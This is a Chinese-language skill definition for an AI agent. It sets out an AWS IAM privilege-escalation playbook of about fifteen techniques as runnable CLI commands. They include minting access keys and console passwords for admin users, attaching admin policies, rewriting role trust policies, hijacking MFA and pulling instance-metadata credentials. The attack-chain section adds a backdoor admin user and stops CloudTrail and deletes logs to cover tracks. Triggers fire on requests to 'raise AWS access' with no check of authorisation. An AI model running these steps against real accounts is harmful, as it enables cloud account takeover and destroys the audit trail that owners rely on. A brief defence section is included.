---
name: aws-iam-privesc
description: AWS IAM 权限提升完整技术集合 - 包含 30+ 种权限提升方法
category: 云安全渗透测试
platform: AWS
technique_type: 权限提升
triggers:
  - "AWS IAM 权限提升"
  - "iam privesc"
  - "提升 AWS 权限"
  - "AWS 权限绕过"
---

# AWS IAM 权限提升技术

## 触发条件

当用户要求以下任务时激活此技能：

- "测试 AWS IAM 权限提升"
- "检查 IAM 权限漏洞"
- "提升 AWS 访问权限"
- "AWS 渗透测试 IAM"
- "iam:CreateAccessKey 利用"

---

## 技术清单

### 1. `iam:CreateAccessKey`

**原理**: 为任意用户（包括管理员）创建访问密钥

**利用命令**:
```bash
# 枚举用户
aws iam list-users --query 'Users[].UserName'

# 查找高权限用户
aws iam list-attached-user-policies --user-name target-admin
aws iam list-user-policies --user-name target-admin

# 为管理员创建访问密钥
aws iam create-access-key --user-name admin-user

# 输出示例:
{
    "AccessKey": {
        "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "Status": "Active",
        "UserName": "admin-user"
    }
}

# 使用新凭证配置 Profile
aws configure --profile stolen-admin
# 验证权限
aws sts get-caller-identity --profile stolen-admin
```

**影响**: 直接获取管理员级别的 API 访问权限

---

### 2. `iam:CreateLoginProfile` / `iam:UpdateLoginProfile`

**原理**: 为任意用户设置控制台登录密码

**利用命令**:
```bash
# 检查用户是否已有登录密码
aws iam get-login-profile --user-name target-user
# 如果报错 "NoSuchEntity"，说明用户无密码，可以设置

# 设置登录密码
aws iam create-login-profile \
  --user-name target-user \
  --password 'P@ssw0rd!123' \
  --password-reset-required false

# 更新现有密码
aws iam update-login-profile \
  --user-name target-user \
  --password 'NewP@ssw0rd!123' \
  --password-reset-required false

# 现在可以通过控制台登录
# https://target-account.signin.aws.amazon.com/console/
```

**影响**: 可以通过控制台登录获取完整权限

---

### 3. `iam:AttachUserPolicy` / `iam:AttachGroupPolicy`

**原理**: 为自己或组附加管理员策略

**利用命令**:
```bash
# 方法1: 为自己附加托管策略
aws iam attach-user-policy \
  --user-name my-username \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 方法2: 为用户组附加策略
aws iam attach-group-policy \
  --group-name Administrators \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 验证策略已附加
aws iam list-attached-user-policies --user-name my-username
```

**影响**: 直接获得管理员权限

---

### 4. `iam:PutUserPolicy` / `iam:PutRolePolicy`

**原理**: 创建内联策略授予任意权限

**利用命令**:
```bash
# 创建管理员策略
cat > admin-policy.json <<EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
EOF

# 为用户添加内联策略
aws iam put-user-policy \
  --user-name my-username \
  --policy-name FullAdminPolicy \
  --policy-document file://admin-policy.json

# 为角色添加内联策略
aws iam put-role-policy \
  --role-name target-role \
  --policy-name BackdoorPolicy \
  --policy-document file://admin-policy.json

# 验证
aws iam get-user-policy --user-name my-username --policy-name FullAdminPolicy
```

**影响**: 直接获得完整的管理员权限

---

### 5. `iam:AddUserToGroup`

**原理**: 将自己添加到管理员组

**利用命令**:
```bash
# 枚举用户组
aws iam list-groups

# 检查组权限
aws iam list-attached-group-policies --group-name Administrators
aws iam get-group-policy --group-name Administrators --policy-name AdminPolicy

# 将自己添加到管理员组
aws iam add-user-to-group \
  --group-name Administrators \
  --user-name my-username

# 验证
aws iam list-groups-for-user --user-name my-username
```

**影响**: 继承组的所有权限

---

### 6. `iam:CreatePolicyVersion`

**原理**: 创建新版本策略并设为默认，绕过 `iam:SetDefaultPolicyVersion`

**利用命令**:
```bash
# 查看当前策略版本
aws iam get-policy --policy-arn arn:aws:iam::123456789012:policy/RestrictedPolicy

# 创建新版本（提升权限）
cat > new-policy.json <<EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
EOF

aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/RestrictedPolicy \
  --policy-document file://new-policy.json \
  --set-as-default

# 如果限制版本数量，先删除旧版本
aws iam delete-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/RestrictedPolicy \
  --version-id v1
```

**影响**: 绕过版本限制，直接提升权限

---

### 7. `iam:SetDefaultPolicyVersion`

**原理**: 将已有的旧版本（高权限）设为默认

**利用命令**:
```bash
# 列出所有版本
aws iam list-policy-versions \
  --policy-arn arn:aws:iam::123456789012:policy/TargetPolicy

# 如果有旧的高权限版本，设为默认
aws iam set-default-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/TargetPolicy \
  --version-id v2
```

**影响**: 恢复旧版本的高权限

---

### 8. `iam:UpdateAssumeRolePolicy`

**原理**: 修改角色的信任策略，让自己可以扮演该角色

**利用命令**:
```bash
# 查看可用的角色
aws iam list-roles

# 修改角色的信任策略
cat > trust-policy.json <<EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "sts:AssumeRole",
            "Principal": {
                "AWS": "arn:aws:iam::123456789012:user/my-username"
            }
        }
    ]
}
EOF

aws iam update-assume-role-policy \
  --role-name TargetRole \
  --policy-document file://trust-policy.json

# 扮演角色
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/TargetRole \
  --role-session-name backdoor

# 使用临时凭证
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

**影响**: 获得角色的所有权限

---

### 9. `iam:PassRole` + `ec2:RunInstances`

**原理**: 以高权限 IAM Role 启动 EC2 实例

**利用命令**:
```bash
# 枚举可用的 Instance Profiles
aws iam list-instance-profiles

# 启动 EC2 实例并附加 Role
aws ec2 run-instances \
  --image-id ami-0c55b159cbfafe1f0 \
  --instance-type t2.micro \
  --iam-instance-profile Name=AdminProfile \
  --key-name my-key-pair

# 等待实例启动后，通过 SSH 连接
ssh -i my-key-pair.pem ubuntu@<INSTANCE_IP>

# 在实例上访问元数据服务获取 Role 凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
```

**影响**: 通过 EC2 实例获取高权限 Role 的临时凭证

---

### 10. `iam:CreateVirtualMFADevice` + `iam:EnableMFADevice`

**原理**: 为目标用户创建虚拟 MFA 设备并激活，完全接管账户

**利用命令**:
```bash
# 创建虚拟 MFA 设备（返回 serial 和 base32 seed）
aws iam create-virtual-mfa-device --virtual-mfa-device-name BackdoorMFA

# 从 seed 生成 2 个连续的 TOTP 代码
# 使用 oathtool 或类似工具:
# oathtool --base32 --totp <BASE32_SEED>

# 激活 MFA 设备
aws iam enable-mfa-device \
  --user-name target-user \
  --serial-number arn:aws:iam::123456789012:mfa/BackdoorMFA \
  --authentication-code1 <CODE1> \
  --authentication-code2 <CODE2>

# 现在可以使用 MFA 进行高权限操作
```

**影响**: 完全接管目标用户的 MFA，绕过 MFA 保护

---

### 11. `iam:UpdateAccessKey`

**原理**: 激活已禁用的访问密钥

**利用命令**:
```bash
# 列出用户的所有访问密钥
aws iam list-access-keys --user-name target-user

# 激活已禁用的密钥
aws iam update-access-key \
  --access-key-id AKIA... \
  --status Active \
  --user-name target-user
```

**影响**: 重新激活已禁用的访问密钥

---

### 12. `iam:CreateServiceSpecificCredential`

**原理**: 为特定服务（如 CodeCommit）创建凭据

**利用命令**:
```bash
# 创建 CodeCommit 凭据
aws iam create-service-specific-credential \
  --user-name target-user \
  --service-name codecommit.amazonaws.com

# 保存返回的:
# - ServiceSpecificCredential.ServiceUserName
# - ServiceSpecificCredential.ServicePassword

# 查找可访问的仓库
aws codecommit list-repositories

# 克隆仓库
git clone https://git-codecommit.us-east-1.amazonaws.com/v1/repos/REPO_NAME
# 使用 ServiceUserName/ServicePassword 作为凭据

# 如果仓库中包含 AWS 凭据，可以进一步渗透
```

**影响**: 获取特定服务的访问权限，可能泄露更多凭据

---

### 13. `iam:UploadSSHPublicKey`

**原理**: 上传 SSH 公钥以访问 CodeCommit

**利用命令**:
```bash
# 上传 SSH 公钥
aws iam upload-ssh-public-key \
  --user-name target-user \
  --ssh-public-key-body file:///path/to/public/key.pub

# 克隆 CodeCommit 仓库
git clone ssh://git-codecommit.us-east-1.amazonaws.com/v1/repos/REPO_NAME
```

**影响**: 通过 SSH 访问 CodeCommit 仓库

---

### 14. `iam:DeactivateMFADevice`

**原理**: 禁用用户的 MFA 设备

**利用命令**:
```bash
# 列出用户的 MFA 设备
aws iam list-mfa-devices --user-name target-user

# 禁用 MFA 设备
aws iam deactivate-mfa-device \
  --user-name target-user \
  --serial-number arn:aws:iam::123456789012:mfa/MFA_DEVICE
```

**影响**: 移除 MFA 保护，使账户更容易被入侵

---

### 15. `iam:ResyncMFADevice`

**原理**: 重新同步 MFA 设备

**利用命令**:
```bash
# 重新同步 MFA
aws iam resync-mfa-device \
  --user-name target-user \
  --serial-number arn:aws:iam::123456789012:mfa/MFA_DEVICE \
  --authentication-code1 <CODE1> \
  --authentication-code2 <CODE2>
```

**影响**: 可能用于绕过某些 MFA 保护机制

---

## 完整攻击流程

### 步骤 1: 枚举当前权限

```bash
# 使用 enumerate-iam 工具
./enumerate-iam.py --access-key AKIA... --secret-key ...

# 或手动检查
aws iam list-attached-user-policies --user-name $USER
aws iam list-user-policies --user-name $USER
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/my-user \
  --action-names iam:CreateAccessKey,iam:AttachUserPolicy \
  --resource-arns "*"
```

### 步骤 2: 选择攻击路径

根据枚举结果，选择可用的权限提升方法：

| 权限 | 攻击方法 | 难度 |
|------|---------|------|
| `iam:CreateAccessKey` | 为管理员创建密钥 | ⭐ |
| `iam:CreateLoginProfile` | 设置控制台密码 | ⭐ |
| `iam:AttachUserPolicy` | 附加管理员策略 | ⭐ |
| `iam:PutUserPolicy` | 创建内联策略 | ⭐ |
| `iam:AddUserToGroup` | 加入管理员组 | ⭐ |
| `iam:UpdateAssumeRolePolicy` | 修改角色信任策略 | ⭐⭐ |
| `iam:PassRole` + `ec2:RunInstances` | 启动高权限 EC2 | ⭐⭐ |
| `iam:CreatePolicyVersion` | 创建新策略版本 | ⭐⭐ |

### 步骤 3: 执行攻击

```bash
# 示例：使用 iam:PassRole + ec2:RunInstances
aws ec2 run-instances \
  --image-id ami-xxxxxxxx \
  --instance-type t2.micro \
  --iam-instance-profile Name=SSMManagedInstanceCore \
  --key-name mykey

# 通过 SSM Session Manager 连接
aws ssm start-session --target i-xxxxxxxx

# 获取实例元数据凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 步骤 4: 建立持久化

```bash
# 创建后门用户
aws iam create-user --user-name backdoor-user
aws iam create-access-key --user-name backdoor-user

# 添加到管理员组
aws iam add-user-to-group \
  --group-name Administrators \
  --user-name backdoor-user
```

### 步骤 5: 清除痕迹

```bash
# 停止 CloudTrail
aws cloudtrail stop-logging --name SecurityTrail

# 删除检测日志（如果可能）
aws logs delete-log-group --log-group-name /aws/cloudtrail
```

---

## 防御措施

### 检测方法

```bash
# 监控可疑的 IAM 操作
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey

# 检查异常的策略变更
aws iam get-account-authorization-details
```

### 防御建议

1. **启用 MFA**: 所有用户强制启用 MFA
2. **最小权限**: 严格限制 IAM 权限
3. **监控告警**: 设置 CloudTrail 告警规则
4. **定期审计**: 定期审查 IAM 策略和访问密钥
5. **权限边界**: 使用 Permissions Boundary 限制权限

---

## 参考资源

- HackTricks AWS IAM Privesc: https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-pentesting/aws-iam-privesc
- AWS IAM 最佳实践: https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html
- AWS Security Hub: https://aws.amazon.com/security-hub/
